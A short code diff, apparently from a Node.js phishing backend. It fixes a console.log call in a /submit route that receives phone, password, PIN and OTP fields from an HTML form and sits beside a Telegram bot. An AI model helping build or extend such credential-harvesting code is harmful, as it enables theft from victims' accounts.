@@ -18,7 +18,7 @@ const bot = new TelegramBot(process.env.BOT_TOKEN);
 // Main Route jo HTML form ke fetch call se connect hoga
 app.post("/submit", async (req, res) => {
     try {
-console.logreq.body
+console.log(req.body);
         // HTML se bheja gaya data yahan receive ho raha hai
         const { phone,password,pin,otp,issue } = req.body;
 
